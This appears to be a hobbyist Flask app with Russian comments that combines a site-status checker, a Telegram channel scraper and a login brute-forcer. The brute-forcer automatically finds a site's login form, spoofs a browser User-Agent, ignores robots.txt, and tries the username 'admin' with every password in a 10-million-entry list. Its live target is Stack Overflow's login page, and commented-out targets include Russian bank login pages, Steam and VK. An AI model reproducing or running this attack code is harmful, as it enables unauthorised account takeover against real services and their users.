import urllib.error
from collections import namedtuple
import requests
import re
import mechanize
from crontab import CronTab

import configparser
import json
import asyncio
from datetime import date, datetime

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import (GetHistoryRequest)
from telethon.tl.types import (
    PeerChannel
)
import asyncio

from flask_apscheduler import APScheduler

from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)
scheduler = APScheduler()
Message = namedtuple('Message', 'protocol url domain')
messages = []
Info = namedtuple('Info', 'Code Status ResponseTime Result')  # Кортеж для вывода инфорации
information = []

def get_status(url):
    try:
        print('Попытка подключения...')
        response = requests.head(url, timeout=5)
        status_code = response.status_code
        reason = response.reason
        response_time = response.elapsed.total_seconds()
        result = 'all good'
        if response_time > 1.5:
            result = 'Угроза ddos атаки'
    except requests.exceptions.ConnectionError:
        status_code = '000'
        reason = 'Denial of Service'
        response_time = 'Infinity'
        result = 'Сайт недоступен'
    website_status = (status_code, reason, response_time, result)
    return website_status


@app.route('/', methods=['GET'])
def hello_world():
    return render_template('index.html')


@app.route('/main', methods=['GET'])
def main():
    return render_template('main.html', information=information)


@app.route('/bruteforce', methods=['GET'])
def bruteforce():
    return render_template('bruteforce.html')


@app.route('/telegram', methods=['GET'])
def telegram():
    return render_template('telegram.html')



@app.route('/find_in_telegram', methods=['POST'])
def telegram_search():
    config = configparser.ConfigParser()
    config.read("config.ini")

    # Setting configuration values
    api_id = config['Telegram']['api_id']
    api_hash = config['Telegram']['api_hash']
    api_hash = str(api_hash)

    phone = config['Telegram']['phone']
    username = config['Telegram']['username']

    # Create the client and connect
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(username, api_id, api_hash, loop=loop)

    # some functions to parse json date
    class DateTimeEncoder(json.JSONEncoder):
        def default(self, o):
            if isinstance(o, datetime):
                return o.isoformat()

            if isinstance(o, bytes):
                return list(o)

            return json.JSONEncoder.default(self, o)

    async def main(phone):
        await client.start()
        print("Client Created")
        # Ensure you're authorized
        if await client.is_user_authorized() == False:
            await client.send_code_request(phone)
            try:
                await client.sign_in(phone, input('Enter the code: '))
            except SessionPasswordNeededError:
                await client.sign_in(password=input('Password: '))

        me = await client.get_me()

        user_input_channel = input('enter entity(telegram URL or entity id):')

        if user_input_channel.isdigit():
            entity = PeerChannel(int(user_input_channel))
        else:
            entity = user_input_channel

        my_channel = await client.get_entity(entity)

        offset_id = 0
        limit = 100
        all_messages = []
        total_messages = 0
        total_count_limit = 0

        while True:
            print("Current Offset ID is:", offset_id, "; Total Messages:", total_messages)
            history = await client(GetHistoryRequest(
                peer=my_channel,
                offset_id=offset_id,
                offset_date=None,
                add_offset=0,
                limit=limit,
                max_id=0,
                min_id=0,
                hash=0
            ))
            if not history.messages:
                break
            messages = history.messages
            for message in messages:
                all_messages.append(message.to_dict())
            offset_id = messages[len(messages) - 1].id
            total_messages = 30
            if total_count_limit != 0 and total_messages >= total_count_limit:
                break

        all_user_message = ""
        for mes in all_messages:
            all_user_message += str(mes[list(mes.keys())[4]])
        with open('channel_messages.json', 'w') as outfile:
            json.dump(all_messages, outfile, cls=DateTimeEncoder)
        print(all_user_message.count('CTF'))

    with client:
        client.loop.run_until_complete(main(phone))
    return render_template('telegram.html')


@app.route('/start_brute', methods=['POST'])
def start_brute():
    def start_bruteforce():
        br = mechanize.Browser()
        # Установите, следует ли соблюдать правила от роботов.txt.
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)  # Нет роботов
        # Всегда используйте user-Agent, потому что это поможет вам замаскировать личность бота с любым браузером.
        # br.addheaders = ['Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US']
        header = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20100101 Firefox/14.0.1',
                  'Referer': 'http://whateveritis.com'}
        # site = 'http://localhost/login.php'
        # site = 'https://steamcommunity.com/login/home/?goto=market%2F'
        # site = 'https://stackoverflow.com/users/signup?ssrc=head&returnurl=https%3a%2f%2fstackoverflow.com%2fquestions%2f3956280%2fsubmitting-a-form-in-mechanize'
        site = "https://stackoverflow.com/users/login?ssrc=head"
        # site = "https://online.akbars.ru/"
        # site = "https://online.sberbank.ru/CSAFront/index.do#/"
        # site = "https://online.vtb.ru/login"
        # site = "https://id.vk.com/auth?app_id=7913379&v=1.44.0&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&uuid=2zPMizo1cvJkU8AKgvMn0&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl9pbiJ9fQ%3D%3D"
        try:
            response = br.open(site)
        except urllib.error.URLError:
            print('Хост разорвал соединение')
        login_url = response.geturl()
        print('Добро пожаловать на', response.geturl())
        # print(response.read())
        # ГИБКИЙ ПОИСК ФОРМЫ
        availabe_forms = list(br.forms())
        print("Всего найдено " + str(len(availabe_forms)) + " форм")
        if len(availabe_forms) == 0:
            print('Форма не найдена')  # что-то сделать
            return False
        index_of_work_form = ""
        for i in range(0, len(availabe_forms)):
            if ("POST" in str(availabe_forms[i]) or "post" in str(availabe_forms[i])):
                index_of_work_form = i  # Нашли индекс рабочей формы.
                print('Найдена форма с методом POST, ее индекс: ' + str(index_of_work_form))  # что-то сделат
        if index_of_work_form == "":
            print('Форма для ввода логина и пароля не найдена:')
            for form in availabe_forms:
                print(form)
            return False
        # ГИБКИЙ ПОИСК АТРИБУТОВ
        br.select_form(nr=index_of_work_form)
        availabe_controls = list(br.form.controls)
        password_controls = ""
        login_controls = ""
        for j in range(len(availabe_controls)):
            if "pass" in str(availabe_controls[j]):
                password_controls = availabe_controls[j]
        regexp = r"<TextControl\([a-zA-Z]+=\)>"
        for k in range(len(availabe_controls)):
            match = re.search(regexp, str(availabe_controls[k]))
            if match is not None:
                login_controls = availabe_controls[k]
                # print(match.group(0))
            else:
                pass  # ЧТО-ТО ДЕЛАТЬ
        # ГИБКИЙ ПОИСК ИНПУТОВ логина и пароля
        login_input = ""
        password_input = ""
        regexp_input = r"\(.*\.*\="
        match_password_input = re.search(regexp_input, str(password_controls))
        if match_password_input is not None:
            password_input = match_password_input.group(0)
            password_input = password_input[1:-1]
        else:
            pass  # ЧТО-ТО ДЕЛАТЬ
        match_login_input = re.search(regexp_input, str(login_controls))
        if match_login_input is not None:
            login_input = match_login_input.group(0)
            login_input = login_input[1:-1]
        else:
            pass  # ЧТО-ТО ДЕЛАТЬ
        print(login_input)
        print(password_input)

        # ВВОД УЧЕТНЫХ ДАННЫХ
        def is_logged_in(page_url):
            if ("capt" in page_url or "CAPT" in page_url):
                print("Работает catcha")
                print(page_url)
                return False
            return not login_url in page_url

        file1 = open("10MPass.txt", "r")
        lines = file1.readlines()
        try:
            for line in lines:
                br.select_form(nr=index_of_work_form)
                br.form[login_input] = 'admin'
                br.form[password_input] = str(line.split('\n')[0])
                result = br.submit()
                if is_logged_in(result.geturl()):  # ПРОДУМАТЬ ЗАЩИТУ ОТ КАПЧИ
                    print("Пароль успешно найден!")
                    print('admin: ' + line)
                    print(result.geturl())
                    br.close()
                    file1.close
                    break
                else:
                    print(line + " Failed")
        except Exception:
            print('Стоит защита от бруфорса')

        # print(response.geturl()) # Страница, на которую должна перенаправлять после авторизации
        # or br.submit(name='Button_Name', label='button_label')
        # br.submit(nr=0) Также можно выбрать на какую кнопку нажимать. Можно выбрать по имени

    start_bruteforce()
    # scheduler.add_job(id='Scheduled Task', func=start_bruteforce, trigger="interval", seconds=30)
    # scheduler.start()
    return render_template('bruteforce.html')


@app.route('/check_site', methods=['POST'])
def add_message():
    protocol = request.form['protocol']
    url = request.form['url']
    domain = request.form['domain']
    site = '{}://{}.{}'.format(protocol, url, domain)

    def status():
        website_status = get_status(site)
        Code = website_status[0]
        Status = website_status[1]
        ResponseTime = website_status[2]
        Result = website_status[3]
        print(site)
        print('Код:', website_status[0], '| Статус:', Status, '| Время ответа:', website_status[2], '| Итог:',
              website_status[3])
        information.append(Info(Code, Status, ResponseTime, Result))

    status()
    scheduler.add_job(id='Scheduled Task', func=status, trigger="interval", seconds=30)
    scheduler.start()
    return redirect(url_for('main'))


@app.route('/clear', methods=['POST'])
def clear():
    i = len(information)
    print(i)
    while i != 0:
        information[i - 1] = ""
        i = i - 1
    return redirect(url_for('main'))


'''
# Находим форму по action/ можно еще находить по name и по id
def select_form(form):
    return form.attrs.get('action', None) == 'login.php'
form = br.select_form(predicate=select_form)
    br.submit()
    print(form)
    # br.form.set_all_readonly(False) # Во все элементы можно вписать
    #

'''
